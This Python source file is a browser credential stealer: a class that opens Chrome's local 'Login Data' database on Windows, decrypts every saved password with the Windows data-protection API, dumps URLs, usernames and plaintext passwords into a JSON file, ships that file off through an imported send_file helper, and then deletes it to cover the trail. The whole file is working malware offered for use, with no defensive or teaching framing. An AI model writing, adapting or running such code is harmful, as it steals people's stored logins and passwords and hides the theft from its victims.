import os
import sqlite3
import win32crypt
import json
from send_file import send_file
from removefile import removefile

class chromepasswords:
    def __init__(self, output_file='chrome_passwords.json'):
        self.output_file = output_file

    def get_passwords(self):
        passwords = []
        path = os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data'
        try:
            connection = sqlite3.connect(path)
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                value = v.fetchall()

            for origin_url, username, password in value:
                password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                if password:
                    passwords.append({
                        'origin_url': origin_url,
                        'username': username,
                        'password': password.decode('utf-8')
                    })
        except Exception as e:
            print(e)
        return passwords

    def write_passwords(self):
        passwords = self.get_passwords()
        with open(self.output_file, 'w') as f:
            f.write(json.dumps(passwords))

    def send_passwords(self):
        send_file('chrome_passwords.json')
    
    def remove(self):
        removefile('chrome_passwords.json')
